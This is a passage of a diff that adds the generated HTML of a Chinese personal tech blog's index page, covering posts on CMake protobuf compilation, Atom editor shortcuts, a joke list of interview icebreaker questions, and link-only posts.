+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/09/all-about-java/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/09/all-about-java/" itemprop="url">
+                  all about java
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-09T00:00:00+08:00">
+                2015-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://tower.im/" target="_blank" rel="external">https://tower.im/</a></p>
+<p><a href="https://github.com/Chen-tao/Chen-tao.github.io/blob/master/docs/java_pub.doc" target="_blank" rel="external">doc</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/09/newbee-problem/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/09/newbee-problem/" itemprop="url">
+                  新人破冰问题
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-09T00:00:00+08:00">
+                2015-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>传闻中阿里巴巴的破冰问题，搬过来看一下，有的问题与Google的有异曲同工之妙</p>
+</blockquote>
+<p>初次访问发生在几点几分？ </p>
+<p>完全打开首页花费多少时间？ </p>
+<p>是否浏览完整个首页后再去找login入口？</p>
+<p> 找login入口花了多少时间？ </p>
+<p>是否在服务器提示下找到入口？ </p>
+<p>在找到真正login页面之前，是否误入后台login页面？ </p>
+<p>是否使用XX助手找到入口？ 输错了几次密码后成功登陆？ </p>
+<p>在第一次成功登陆的时候，是否使用https（安全连接）？</p>
+<p>登陆之前购买了多少份https证书？ </p>
+<p>是否由于服务器带宽太小导致登入很慢？ </p>
+<p>登陆成功后服务器是否发出提示音？ </p>
+<p>登陆之后产生了多少PV才最终下单？ </p>
+<p>服务器是否在初次下单后给出红色回执？ </p>
+<p>下单之后留在处于登陆状态几分钟才离开？ </p>
+<p>整个访问过程一共产生了几个session？ </p>
+<p>平均session时长是几分钟？ </p>
+<p>当日访问的cookie类型是cookie2.2还是3.1？ </p>
+<p>当日一共下了多少单？ </p>
+<p>在之后的30日内的活跃度类型（5次-18次属于中度活跃度）</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/08/server-dev-things/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/08/server-dev-things/" itemprop="url">
+                  服务端开发那些事儿
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-08T00:00:00+08:00">
+                2015-11-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://github.com/Chen-tao/Chen-tao.github.io/blob/master/docs/things-about-service-dev.pdf" target="_blank" rel="external">PPT</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/07/cmakeprotoprotobuf-cpp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/07/cmakeprotoprotobuf-cpp/" itemprop="url">
+                  利用Cmake自动编译proto文件生成protobuf cpp代码
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-07T00:00:00+08:00">
+                2015-11-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>项目中pb用的越来越多，更改后手动编译proto越来越麻烦，摸索了下在cmake中自动编译proto文件的办法。</p>
+<ol>
+<li>利用cmake提供的宏PROTOBUF_GENERATE_CPP</li>
+</ol>
+<p>示例代码结构如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[@gapp_devnet_1 ~/tests/cmakepb]$ tree</div><div class="line">.</div><div class="line">|-- CMakeLists.txt</div><div class="line">|-- build</div><div class="line">`-- src</div><div class="line">    |-- CMakeLists.txt</div><div class="line">    |-- main.cpp</div><div class="line">    `-- proto</div><div class="line">        |-- CMakeLists.txt</div><div class="line">        |-- cmd.proto</div><div class="line">        `-- head.proto</div></pre></td></tr></table></figure>
+<p> 顶层CMakeLists.txt如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">project (demo)</div><div class="line">cmake_minimum_required(VERSION 2.8)</div><div class="line">add_subdirectory(src)</div></pre></td></tr></table></figure></p>
+<p> src/CMakeLists.txt如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">add_subdirectory(proto)</div><div class="line">add_executable(demo main.cpp) </div><div class="line">target_link_libraries(demo proto)</div></pre></td></tr></table></figure></p>
+<p> src/proto/CMakeLists.txt如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">find_package(Protobuf REQUIRED)</div><div class="line">FILE(GLOB protofiles &quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.proto&quot;)</div><div class="line">message(STATUS $&#123;protofiles&#125;)</div><div class="line">PROTOBUF_GENERATE_CPP(PROTOSRCS PROTOHDRS $&#123;protofiles&#125;)</div><div class="line">message(STATUS $&#123;PROTOSRCS&#125;)</div><div class="line">add_library(proto STATIC $&#123;PROTOSRCS&#125; $&#123;PROTOHDRS&#125;) </div><div class="line">target_link_libraries(proto protobuf) </div><div class="line">target_include_directories(proto PUBLIC $&#123;CMAKE_CURRENT_BINARY_DIR&#125;)</div></pre></td></tr></table></figure></p>
+<p> 采用out of source编译，cmake将生成的.pb.h,.pb.cc放在build/src/proto/目录下，故而需要在src/proto/CMakeLists.txt中设置<code>target_include_directories(proto PUBLIC ${CMAKE_CURRENT_BINARY_DIR})</code>，这样生成的头文件才能被外层cmake可见。</p>
+<ol>
+<li>利用命令ADD_CUSTOM_COMMAND</li>
+</ol>
+<p>示例代码结构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[@gapp_devnet_1 ~/tests/cmakepb1]$ tree</div><div class="line">.</div><div class="line">|-- CMakeLists.txt</div><div class="line">|-- build</div><div class="line">`-- src</div><div class="line">    |-- CMakeLists.txt</div><div class="line">    |-- main.cpp</div><div class="line">    `-- proto</div><div class="line">        |-- cmd.proto</div><div class="line">        `-- head.proto</div></pre></td></tr></table></figure></p>
+<p>3 directories, 5 files<br> 顶层CMakeLists.txt如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">project (demo)</div><div class="line">cmake_minimum_required(VERSION 2.8)</div><div class="line">add_subdirectory(src)</div></pre></td></tr></table></figure></p>
+<p> src/CMakeLists.txt如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">FILE(GLOB proto_files $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/proto/*.proto)  </div><div class="line">FOREACH(proto_file $&#123;proto_files&#125;)</div><div class="line">    STRING(REGEX REPLACE &quot;[^/]proto&quot; &quot;&quot; proto_file_name $&#123;proto_file&#125;)</div><div class="line">    LIST(APPEND PROTO_SRCS &quot;$&#123;proto_file_name&#125;.pb.cc&quot;)</div><div class="line">	ADD_CUSTOM_COMMAND(</div><div class="line">		OUTPUT &quot;$&#123;proto_file_name&#125;.pb.h&quot; &quot;$&#123;proto_file_name&#125;.pb.cc&quot;</div><div class="line">		COMMAND protoc --proto_path=$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/proto</div><div class="line">                       --cpp_out=$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/proto/ $&#123;proto_file&#125; </div><div class="line">		DEPENDS $&#123;proto_file&#125;</div><div class="line">	)</div><div class="line">ENDFOREACH(proto_file)</div><div class="line">message(STATUS $&#123;PROTO_SRCS&#125;)</div><div class="line">include_directories(./proto)</div><div class="line">add_executable(demo main.cpp $&#123;PROTO_SRCS&#125;) </div><div class="line">target_link_libraries(demo protobuf)</div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/07/atom-shortcuts/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/07/atom-shortcuts/" itemprop="url">
+                  atom shortcuts
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-07T00:00:00+08:00">
+                2015-11-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="文件切换"><a href="#文件切换" class="headerlink" title="文件切换"></a>文件切换</h3><p><code>ctrl-shift-s</code> 保存所有打开的文件</p>
+<p><code>cmd-shift-o</code> 打开目录</p>
+<p><code>cmd-\</code> 显示或隐藏目录树</p>
+<p><code>ctrl-0</code> 焦点移到目录树</p>
+<p>目录树下，使用a，m，delete来增加，修改和删除</p>
+<p><code>cmd-t</code>或<code>cmd-p</code> 查找文件</p>
+<p><code>cmd-b</code> 在打开的文件之间切换</p>
+<p><code>cmd-shift-b</code> 只搜索从上次<code>git commit</code>后修改或者新增的文件</p>
+<h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><p>（等价于上下左右）</p>
+<p><code>ctrl-p</code> 前一行</p>
+<p><code>ctrl-n</code> 后一行</p>
+<p><code>ctrl-f</code> 前一个字符</p>
+<p><code>ctrl-b</code> 后一个字符</p>
+<p><code>alt-B</code>, <code>alt-left</code> 移动到单词开始</p>
+<p><code>alt-F</code>, <code>alt-right</code> 移动到单词末尾</p>
+<p><code>cmd-right</code>, <code>ctrl-E</code> 移动到一行结束</p>
+<p><code>cmd-left</code>, <code>ctrl-A</code> 移动到一行开始</p>
+<p><code>cmd-up</code> 移动到文件开始</p>
+<p><code>cmd-down</code> 移动到文件结束</p>
+<p><code>ctrl-g</code> 移动到指定行 <code>row:column</code> 处</p>
+<p><code>cmd-r</code> 在方法之间跳转</p>
+<h3 id="目录树操作"><a href="#目录树操作" class="headerlink" title="目录树操作"></a>目录树操作</h3><p><code>cmd-\</code>或者 <code>cmd-k</code> <code>cmd-b</code> 显示(隐藏)目录树</p>
+<p><code>ctrl-0</code> 焦点切换到目录树(再按一次或者Esc退出目录树)</p>
+<p><code>a</code> 添加文件</p>
+<p><code>d</code> 将当前文件另存为(duplicate)</p>
+<p><code>i</code> 显示(隐藏)版本控制忽略的文件</p>
+<p><code>alt-right</code> 和 <code>alt-left</code> 展开(隐藏)所有目录</p>
+<p><code>ctrl-al-]</code> 和 <code>ctrl-al-[</code> 同上</p>
+<p><code>ctrl-[</code> 和 <code>ctrl-]</code> 展开(隐藏)当前目录</p>
+<p><code>ctrl-f</code> 和 <code>ctrl-b</code> 同上</p>
+<p><code>cmd-k h</code> 或者 <code>cmd-k left</code> 在左半视图中打开文件</p>
+<p><code>cmd-k j</code>或者<code>cmd-k down</code>在下半视图中打开文件</p>
+<p><code>cmd-k k</code> 或者<code>cmd-k up</code> 在上半视图中打开文件</p>
+<p><code>cmd-k l</code> 或者 <code>cmd-k right</code> 在右半视图中打开文件</p>
+<p><code>ctrl-shift-C</code> 复制当前文件绝对路径</p>
+<h3 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h3><p><code>cmd-F2</code> 在本行增加书签<br><code>F2</code> 跳到当前文件的下一条书签<br><code>shift-F2</code> 跳到当前文件的上一条书签<br><code>ctrl-F2</code> 列出当前工程所有书签</p>
+<h3 id="选取"><a href="#选取" class="headerlink" title="选取"></a>选取</h3><p>大部分和导航一致，只不过加上shift</p>
+<p><code>ctrl-shift-P</code> 选取至上一行</p>
+<p><code>ctrl-shift-N</code> 选取至下一样</p>
+<p><code>ctrl-shift-B</code> 选取至前一个字符</p>
+<p><code>ctrl-shift-F</code> 选取至后一个字符</p>
+<p><code>alt-shift-B</code>, <code>alt-shift-left</code> 选取至字符开始</p>
+<p><code>alt-shift-F</code>, <code>alt-shift-right</code> 选取至字符结束</p>
+<p><code>ctrl-shift-E</code>, <code>cmd-shift-right</code> 选取至本行结束</p>
+<p><code>ctrl-shift-A</code>, <code>cmd-shift-left</code> 选取至本行开始</p>
+<p><code>cmd-shift-up</code> 选取至文件开始</p>
+<p><code>cmd-shift-down</code> 选取至文件结尾</p>
+<p><code>cmd-A</code> 全选</p>
+<p><code>cmd-L</code> 选取一行，继续按回选取下一行</p>
+<p><code>ctrl-shift-W</code> 选取当前单词</p>
+<h3 id="编辑和删除文本"><a href="#编辑和删除文本" class="headerlink" title="编辑和删除文本"></a>编辑和删除文本</h3><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><code>ctrl-T</code> 使光标前后字符交换</p>
+<p><code>cmd-J</code> 将下一行与当前行合并</p>
+<p><code>ctrl-cmd-up</code>, <code>ctrl-cmd-down</code> 使当前行向上或者向下移动</p>
+<p><code>cmd-shift-D</code> 复制当前行到下一行</p>
+<p><code>cmd-K</code>, <code>cmd-U</code> 使当前字符大写</p>
+<p><code>cmd-K</code>, <code>cmd-L</code> 使当前字符小写</p>
+<h3 id="删除和剪切"><a href="#删除和剪切" class="headerlink" title="删除和剪切"></a>删除和剪切</h3><p><code>ctrl-shift-K</code> 删除当前行</p>
+<p><code>cmd-backspace</code> 删除到当前行开始</p>
+<p><code>cmd-fn-backspace</code> 删除到当前行结束</p>
+<p><code>ctrl-K</code> 剪切到当前行结束</p>
+<p><code>alt-backspace</code> 或 <code>alt-H</code> 删除到当前单词开始</p>
+<p><code>alt-delete</code> 或 <code>alt-D</code> 删除到当前单词结束</p>
+<h3 id="多光标和多处选取"><a href="#多光标和多处选取" class="headerlink" title="多光标和多处选取"></a>多光标和多处选取</h3><p><code>cmd-click</code> 增加新光标</p>
+<p><code>cmd-shift-L</code> 将多行选取改为多行光标</p>
+<p><code>ctrl-shift-up</code>, <code>ctrl-shift-down</code> 增加上（下）一行光标</p>
+<p><code>cmd-D</code> 选取文档中和当前单词相同的下一处</p>
+<p><code>ctrl-cmd-G</code> 选取文档中所有和当前光标单词相同的位置</p>
+<h3 id="括号跳转"><a href="#括号跳转" class="headerlink" title="括号跳转"></a>括号跳转</h3><p><code>ctrl-m</code> 相应括号之间，<code>html tag</code>之间等跳转</p>
+<p><code>ctrl-cmd-m</code> 括号(tag)之间文本选取</p>
+<p><code>alt-cmd-.</code> 关闭当前XML/HTML tag</p>
+<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p><code>ctrl-shift-U</code> 调出切换编码选项</p>
+<h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><p><code>cmd-F</code> 在buffer中查找</p>
+<p><code>cmd-shift-f</code> 在整个工程中查找</p>
+<h3 id="代码片段"><a href="#代码片段" class="headerlink" title="代码片段"></a>代码片段</h3><p><code>alt-shift-S</code> 查看当前可用代码片段</p>
+<p>在<code>~/.atom</code>目录下<code>snippets.cson</code>文件中存放了你定制的<code>snippets</code></p>
+<p><a href="https://atom.io/docs/v1.0.0/using-atom-snippets" target="_blank" rel="external">定制说明</a></p>
+<h3 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h3><p><code>ctrl-space</code> 提示补全信息</p>
+<h3 id="折叠"><a href="#折叠" class="headerlink" title="折叠"></a>折叠</h3><p><code>alt-cmd-[</code> 折叠</p>
+<p><code>alt-cmd-]</code> 展开</p>
+<p><code>alt-cmd-shift-{</code> 折叠全部</p>
+<p><code>alt-cmd-shift-}</code> 展开全部</p>
+<p><code>cmd-k</code> <code>cmd-N</code> 指定折叠层级 N为层级数</p>
+<h3 id="文件语法高亮"><a href="#文件语法高亮" class="headerlink" title="文件语法高亮"></a>文件语法高亮</h3><p><code>ctrl-shift-L</code> 选择文本类型</p>
+<h3 id="使用Atom进行写作"><a href="#使用Atom进行写作" class="headerlink" title="使用Atom进行写作"></a>使用Atom进行写作</h3><p><code>ctrl-shift-M</code> Markdown预览</p>
+<h3 id="可用代码片段"><a href="#可用代码片段" class="headerlink" title="可用代码片段"></a>可用代码片段</h3><p><code>b, legal, img, l, i, code, t, table</code></p>
+<h3 id="git操作"><a href="#git操作" class="headerlink" title="git操作"></a>git操作</h3><p><code>cmd-alt-Z</code> checkout HEAD 版本</p>
+<p><code>cmd-shift-B</code> 弹出untracked 和 modified文件列表</p>
+<p><code>alt-g down</code> <code>alt-g up</code> 在修改处跳转</p>
+<p><code>alt-G D</code> 弹出diff列表</p>
+<p><code>alt-G O</code> 在github上打开文件</p>
+<p><code>alt-G G</code> 在github上打开项目地址</p>
+<p><code>alt-G B</code> 在github上打开文件blame</p>
+<p><code>alt-G H</code> 在github上打开文件history</p>
+<p><code>alt-G I</code> 在github上打开issues</p>
+<p><code>alt-G R</code> 在github打开分支比较</p>
+<p><code>alt-G C</code> 拷贝当前文件在gihub上的网址</p>
+<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p><a href="https://atom.io/themes/atom-material-ui" target="_blank" rel="external">atom-material-ui</a> </p>
+<p><a href="https://atom.io/themes/atom-material-syntax" target="_blank" rel="external">atom-material-syntax</a></p>
+<h3 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h3><p><a href="https://atom.io/packages/atom-beautify" target="_blank" rel="external">atom-beautify</a></p>
+<p><a href="https://atom.io/packages/file-icons" target="_blank" rel="external">file-icons</a></p>
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p><a href="https://atom.io/packages/atomatigit" target="_blank" rel="external">atomatigit</a></p>
+<h3 id="代码提示"><a href="#代码提示" class="headerlink" title="代码提示"></a>代码提示</h3><p><a href="https://atom.io/packages/emmet" target="_blank" rel="external">emmet</a> </p>
+<p><a href="https://atom.io/packages/atom-ternjs" target="_blank" rel="external">atom-ternjs</a> js代码提示很强大，高度定制化</p>
+<p><a href="https://atom.io/packages/docblockr" target="_blank" rel="external">docblockr jsdoc</a> 给js添加注释。</p>
+<p><a href="https://atom.io/packages/autoclose-html" target="_blank" rel="external">autoclose-html</a> 闭合html标签。</p>
+<p><a href="https://atom.io/packages/color-picker" target="_blank" rel="external">color-picker</a> 取色器</p>
+<p><a href="https://atom.io/packages/pigments" target="_blank" rel="external">pigments</a> 颜色显示插件</p>
+<p><a href="https://atom.io/packages/terminal-panel" target="_blank" rel="external">terminal-panel</a> 直接在atom里面写命令</p>
+<p><a href="https://atom.io/packages/svg-preview" target="_blank" rel="external">svg-preview</a> svg预览</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+          
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400"
+               alt="Chen Tao" />
+          <p class="site-author-name" itemprop="name">Chen Tao</p>
+           
+              <p class="site-description motion-element" itemprop="description">Engineer Blogger Creator Runner | ML DM JVM Web | 旅行 电影 歌手 摄影 | 读书的要义是尽量求得客观的认识，不是为了炫耀自己的‘创造力’，或‘发前人所未发’。 优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。 如果我们可以一次把事情做对做好，在允许的范围内尽可能追求卓越，为什么不去做呢。 | @HNU</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">178</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">92</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chen Tao</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
